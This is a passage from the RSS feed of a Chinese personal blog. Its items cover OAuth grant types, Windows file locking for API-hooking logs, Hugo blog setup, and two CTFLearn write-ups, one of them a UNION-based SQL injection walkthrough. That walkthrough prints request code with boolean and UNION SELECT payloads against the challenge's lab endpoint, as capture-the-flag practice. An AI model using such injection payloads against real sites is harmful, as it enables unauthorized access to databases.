但是它叫简化模式，就是因为它存在安全问题。试想：重要的访问令牌就这样在浏览器和资源提供方之间传递，假设攻击者截获了访问令牌，就能够获取到你的资源。
 5. 密码模式  在密码模式中，用户向客户端提供自己的用户名和密码。客户端使用这些信息向资源服务器索要授权。这就是我们开头讲过的模式，它要求用户提供自己的用户名和密码，但是客户端不得存储这些信息。显然该模式建立在用户对客户端的高度信任上，通常这里的客户端属于操作系统的一部分，或者由著名的公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才考虑使用这种模式。</description>
    </item>
    
    <item>
      <title>进程间文件同步写</title>
      <link>https://xrg.fj.cn/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E6%96%87%E4%BB%B6%E5%90%8C%E6%AD%A5%E5%86%99/</link>
      <pubDate>Sun, 27 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E6%96%87%E4%BB%B6%E5%90%8C%E6%AD%A5%E5%86%99/</guid>
      <description>这段期间没学到任何完整的、值得记录的东西，因此好久没有更新博客了，凑巧中午一边喝大红袍一边搞出了一点东西，虽然不太完整，也不妨一记。
最近在捣鼓Windows下应用程序调用API的情况统计，思路是向指定的进程中注入DLL，钩取系统API，这样每次进程调用API的时候先执行我们的语句，向统计文件中写入一条调用信息。
由此，引出了一个问题：如果我们注入了多个进程，这些进程同时调用一个API的时候，都要往统计文件中写一条信息，如何保持它们的同步呢？
答案就是文件锁。
 锁   互斥锁是操作系统用来保持进程间同步的一个关键工具，多个进程同时对一个对象执行操作的时候，要分清楚先后顺序，否则可能产生混乱。比如，一个进程1要向一个文件里面写入1 ~ 100的数，而进程2要向这个文件里面写入101 ~ 200的数，我们希望进程1写完之后再让进程2写，但是系统在执行进程调度的时候，是可能在进程1写到一半的时候将其挂起，转而去执行其他进程的。想一想有没有可能出现这种情况：进程1写到了50，系统将其挂起，去执行其他进程，其他进程执行完之后，系统不执行进程1，而是执行进程2，于是我们的文件中的数字就变成了1,2&amp;hellip;50,101,102&amp;hellip;
显然，这样的情况是可能出现但是绝对不符合需求的，我们要想办法避免它。
于是操作系统为我们提供了互斥锁，即一个进程对某个对象执行操作的时候，将这个对象锁定，这时其他的进程就无法对这个对象执行操作了。
本篇中的文件锁其实就是作用在文件上的互斥锁。还是刚才的例子，如果进程1在一开始就为文件上了锁，当它执行到一半被挂起的时候，即使系统转为执行进程2，此时进程2也会因为无法获得文件锁而被阻塞；仅当进程1完成了写入，释放了文件锁，进程2才会被唤醒执行。
这样的工作模式可不止用来保持文件的读写同步，还可以解决一系列的同步问题。锁的思想在操作系统领域是非常重要的，这里的介绍不够全面，主要也是由于笔者目前的水平不够，有兴趣的朋友可以自行深入了解。
 创建文件   初步了解了文件锁的含义之后，就要进入编码实践了。本篇后续编码是以C++为主体，但是核心部分完全兼容C语言。
首先要明确一点，C++的文件流操作无法实现文件锁。这个是笔者目前的水平下得出的结论，欢迎见多识广的读者在评论区批评指正。
既然无法使用fstream实现文件锁，就必须老老实实使用C语言的文件操作了。
在这里，由于WindowsAPI提供的文件锁函数需要一个HANDLE类型作为参数，我们只能使用CreateFile函数去创建文件了。
该API详见此文档。
我们使用以下两句话创建了一个文件，这里文件路径可以自由定义。
const char* logPath = &amp;#34;C:\\Users\\Administrator\\Desktop\\recLog.txt&amp;#34;; HANDLE hFile = ::CreateFileA( logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0 ); 值得注意的是CreateFileA的参数OPEN_ALWAYS，该参数指定了文件的打开方式：当文件不存在时，创建它；当文件存在时，打开它。
 文件上锁   文件创建完成之后，正常的下一步操作应该是写入了。但是谨记，为了不发生开头提到的进程同步问题，我们要在写入文件之前先拿到文件的锁。这里使用Windows提供的一个关键函数LockFileEx()。
该API详见此文档我们使用以下几句话为文件上了个锁，这里的overlapped变量是API要求我们传入的，没有很大的用处，将其置零即可。
OVERLAPPED overlapped; memset(&amp;amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000;	// 上锁的字节数，没有很大的意义，非零即可。 if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, &amp;amp;overlapped)) { DWORD err = GetLastError(); printf(&amp;#34;Error %i\n&amp;#34;, err); } 当文件上锁失败，if判断会成立，进入错误处理环节。记住开头提到的锁的机制，当一个进程无法获取当前的文件锁的时候，它应该是会被阻塞而非直接报错。在我的试验中，进入这个分支的情况是第一步CreateFile的时候得到了一个无效的句柄，而非无法获取当前文件的锁。</description>
    </item>
    
    <item>
      <title>博客搭建指南——2</title>
      <link>https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%972/</link>
      <pubDate>Sat, 19 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%972/</guid>
      <description>初生的博客，更新就是频繁。 如果你看到这篇博文，应该能注意到这篇博文的背景有了一点小变化。
没错，在这篇文章里，我要记录一款强大的JS插件particles.js的使用方法，这款应用能让你的网页背景看起来不那么单调（简直非常适合我现在的博客主题）。
你可以在下面这个链接找到这款应用的源码，虽然我成功使用这款插件的历程比较艰辛，但是我还是非常敬佩能写出这种代码的人。
(https://github.com/VincentGarreau/particles.js)
话不多说，let&amp;rsquo;s go!
下载这款插件  你可以直接使用git clone或者从网页上下载它。
解压完成之后，你可以看到一个Demo文件夹，不妨先进去看看正确使用这款应用的时候能产生什么效果。
 在源码中为插件留出位置  在插件作者的GitHub仓库里实际上已经写明了使用方法，但是我要结合hugo和我的主题——Keepit——再详细地介绍一次。
在你的页面中为插件留出位置，这个操作非常简单。打开你的footer.html，找一个合适的位置（最好是最外层），加上一个标签：
&amp;lt;div id=&amp;quot;particles-js&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
然后，就没有然后了！现在你的插件已经能够找到它的容身之所了，准备让它运行起来吧！
p.s footer.html在文件夹partials里，看过第一篇博文的你，应该很熟悉它的内容了吧？关于我们为什么要在这个文件里加上这个东西，主要是考虑到任何界面都有这么一个版权说明模块，那么也就是任何界面到时候都会有漂漂亮亮的背景！还有，我认为可能存在某些主题没有footer.html文件，但是这根本没什么关系，你也可以把这个div加在任何你想要的的地方。
p.p.s 2021年1月14日，现在我把这部分代码加在了layouts/_default/baseof.html，因为它似乎是所有页面的基本框架，适用性更强一些。
 引入插件  你可能会认为，这篇博文的第二步和第三步完全可以调换顺序，如果你这么想了，也这么做了，那我祝你不要踩到我踩过的坑。
我们要在第二步的div底下写入插件。
为什么这样？因为JavaScript的加载顺序是从前往后的。有过Bootstrap框架使用经验的朋友应该知道，在使用Bootstrap的JS应用时，要在之前首先引入jQuery，否则整个页面将无法实现应有的功能！
我们的顺序也是如此。在我使用这个插件的时候，尝试过过几种方法：在/asset/js文件夹中放入相应的JS文件；在partials文件夹中写一个custom_js.html文件，里面是几条简单的&amp;lt;script&amp;gt;标签；修改partials文件夹中的head.html文件，在头部就引入插件；在第二步的&amp;lt;div&amp;gt;之前写入几条&amp;lt;script&amp;gt;标签。
以上方法全部失败。
因此，你不要小看这篇博文的分量，它可能可以帮助你节省几个小时的试错时间。
言归正传，我们还是需要把插件的JS文件引入到源码中。要想插件能够工作，你只需要使用两个文件：particles.js和app.js，他们分别在第一步那个项目的根目录里，还有Demo文件夹里。particles.js是发挥功能的文件，而app.js是配置文件，具体能配置些什么，后面再说，总之，先使用别人帮你写好的东西吧。
接下来的一步很重要：把这两个文件放入public/js文件夹中!
你都看到这篇文章了，肯定已经在GitHub上有自己的第一个页面了吧？你会发现，public文件夹的结构跟你的仓库的结构是一样的，我们的GitPage的CSS、JS等文件，都存在对应的路径底下。也就是说，**当你把这两个JS文件放到了public/js文件夹底下，你等一下git push的时候就会把这两个文件也一并推送到远程仓库的对应位置。**这样，你的源码就能找到JS文件了。
将两个JS文件引入，记得放在第二步的div后面：
&amp;lt;script src=&amp;#34;xxxxx/app.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script src=&amp;#34;xxxxx/particles.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; 这里的“xxxx”是你放置这两个文件的路径，我接下来要教你一个取巧的办法。
 巧妙地获取路径  如果你的代码中，这两个JS文件的路径出了问题，那很不幸，当你打开页面的时候一定是见不到背景的，而且，你按下F12，还能看到控制台给你报出的无情的404 Not Found。
我们要怎么使远程仓库中的代码也能找到正确的路径呢？如果使用src=&amp;quot;/js/app.js&amp;quot;这样的语句，当你打开网站的主页，它会找到https://yourWeb.github.io/js/app.js，看起来非常的正确；但是当你在网站里面的某个页面里，比如某一篇博文中，它就会去找https://yourWeb.github.io/post/article1/js/app.js，必然是失败的，于是你的博文就不能有漂亮的背景了 :(
正确的获取路径的姿势，你可以直接使用绝对路径，也就是https://yourWeb.github.io/js/app.js这样的方式。
底下是我的代码，绝对路径的方法理论上适用于所有主题，你应该把代码里的src值改成自己的仓库：
&amp;lt;script src=&amp;#34;https://sgs4ever.github.io/js/particles.js&amp;#34; async=&amp;#34;&amp;#34; &amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script src=&amp;#34;https://sgs4ever.github.io/js/app.js&amp;#34; async=&amp;#34;&amp;#34; &amp;gt;&amp;lt;/script&amp;gt;  代码的最终样式及推送  经过一系列的修改后，你的页面的代码就多了如下的东西：
&amp;lt;div id=&amp;#34;particles-js&amp;#34;&amp;gt;&amp;lt;/div&amp;gt; &amp;lt;script src=&amp;#34;https://sgs4ever.github.io/js/particles.js&amp;#34; async=&amp;#34;&amp;#34; &amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script src=&amp;#34;https://sgs4ever.</description>
    </item>
    
    <item>
      <title>CTFLearn-07601</title>
      <link>https://xrg.fj.cn/p/ctflearn-07601/</link>
      <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/ctflearn-07601/</guid>
      <description>题目链接：(https://ctflearn.com/challenge/97)
  一道隐写题，信息隐藏在给出的图片文件里。
  打开图片，是一张普通的png，使用010editor打开，发现实际上是jpg格式（以FF开头）。
  010 editor搜索FF D9，找到偏移量为0x256E处的那个，发现其后有敏感的PK字样，这是zip文件的开头，线索已经出现了。
  使用命令分离出zip文件。dd if=AGT.png bs=1 skip=9584 of=foo.zip
  解压文件，得到一个文件夹，里面含有一张图片I Warned You.jpeg
  010 editor打开该文件，发现它实际上不符合JPG文件的格式。用记事本打开，ctrl + f查找ctf字样，得到flag。
  回顾
   这道题大概做了将近一小时&amp;hellip; 是我接触隐写题的简单解法之后第一次实践。解压之后的jpg文件使我一度怀疑自己对偏移量的计算存在问题，万万没想到这jpg格式完全是用来坑爹的（= = ||）。
使用记事本一开始查找的是flag字串，结果是没找到，居然也没有再找一下其他可能的形式，就这么回去又反复检查zip文件的偏移地址了&amp;hellip;&amp;hellip;
 </description>
    </item>
    
    <item>
      <title>CTFLearn-Inj3ctionTime</title>
      <link>https://xrg.fj.cn/p/ctflearn-inj3ctiontime/</link>
      <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/ctflearn-inj3ctiontime/</guid>
      <description>题目链接：(https://ctflearn.com/challenge/149)
 此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
  根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。   ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用  至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。   首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3&amp;#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3,4&amp;#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：</description>
    </item>
    
    <item>
      <title>博客搭建指南——1</title>
      <link>https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%971/</link>
      <pubDate>Fri, 18 Sep 2020 00:00:00 +0000</pubDate>
      
      <guid>https://xrg.fj.cn/p/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%971/</guid>
      <description>当你见到这篇文章的时候，意味着我可以用一种比价体面的方式向所有人分享我的学识和想法了。 搭建博客，说难也难，说容易也容易。难在确定和学习一款建站工具，以及选择一款好看的主题（或者手写一款好看的主题），而容易指的是当你稍微会使用建站工具、并非常幸运地选中了一款好看且易于配置的主题之后，一切后续都变得无比丝滑。
本博客，部署于GitHub，属于静态网页，使用Hugo搭建，使用现成的主题https://themes.gohugo.io/keepit/。
如果你觉得这个主题不错，那么非常幸运地，你可以参考我将要写下的经验，否则本篇对你的意义将打个折扣了。
Then, let&amp;rsquo;s go!  下载Hugo   Hugo 是一款基于Go语言的建站工具，官网说它是“世界上最快的网站框架”，主要正是由于Go语言的高效。这款软件使用起来比较简单，虽然我在整个搭建过程中出了无数错，但是只要你跟着我接下来的介绍走，就只需要使用短短的几个命令。
但是首先，下载一个Hugo是一切步骤的开始。以下步骤全部基于Windows10系统（主要是我没有Mac）。
我们去到下面的这个网址：
(https://github.com/gohugoio/hugo/releases)
在里面你可以下载Windows系统下的Hugo，注意是Hugo_extend而不是hugo，因为有些主题里面用到了SASS/SCSS，需要extend版本的hugo才能完成编译。
将下载的压缩包解压，得到一个文件夹，里面有hugo.exe。接下来将这个文件夹的位置添加到系统环境变量中，就跟你配置java或者是python完全一样，还需要我再讲吗？
好吧，念及这篇博文主要是写给像当年的我一样年轻且好奇的同学，如果有任何问题，还请照着以下步骤来：
 右键我的电脑 &amp;ndash;&amp;gt; 属性 &amp;ndash;&amp;gt; 高级系统设置（在左边栏里） &amp;ndash;&amp;gt; 环境变量（在弹出的窗口的右下角） &amp;ndash;&amp;gt; 在系统变量中找到path这一栏，把你放置Hugo.exe的文件夹路径写进去。
 接下来打开你的命令行窗口，试着执行hugo version，如果你没有得到报错，而是得到了一个hugo的版本信息，那么恭喜你，你取得了一个非常不错的开端！
 新建站点   用hugo新建站点实在是非常简单。在你电脑上某个位置打开你的命令行，敲上命令：
hugo new site [yourSiteName]
就完事了！这里的 [yourSiteName] 可以替换成任何你想要的名字，为你的网站起个好名吧！
如果顺利的话，你将会得到一个名字为yourSiteName的文件夹，里面有一些hugo为你初始化好的文件夹，你可以使用ls查看它们。
新建站点
 选择主题   “一款好看的主题是你坚持写博客的最大动力。” ——沃兹·基·硕德
你现在浏览的——也就是我的博客——主题是：https://themes.gohugo.io/keepit/实际上，在上面这个网站上还有非常多的酷炫的主题，完全看你的喜好去选择——不考虑配置难度的情况下 ヽ(ー_ー)ノ
当你选定了一个主题，点进去，一般都会在底下有一个非常周到的安装指南（真的只是安装指南o(╥﹏╥)o）。
就以这款KeepIt主题为例，我们的网站根目录下有一个themes文件夹，你只需要进入这个文件夹，使用命令git clone https://github.com/Fastbyte01/KeepIt.git，就可以将这个主题下载到你的网站里了。从此，你就可以快乐地使用themes文件夹底下存在的主题，而且变换主题的成本非常之低，这个我们之后会讲。
 配置页面   现在让你的命令行回到网站的根目录下，写下命令hugo server --theme=keepit -D，然后你就发现hugo已经在你的电脑上跑起了一个Web服务。打开浏览器，根据命令行的提示输入地址，就可以访问你的页面了！刚才说过，当你的themes文件夹下面有多个主题时，你可以轻易地更换它们，具体的操作就是将--theme这个参数指定为你想用的主题的名字，就问你简单不？
回到你的网站上吧，看看效果。
什么？你说你的页面现在空无一物？或者你的页面还只是个模板？理所当然。因为你还没有配置它。</description>
    </item>
    
  </channel>
</rss>
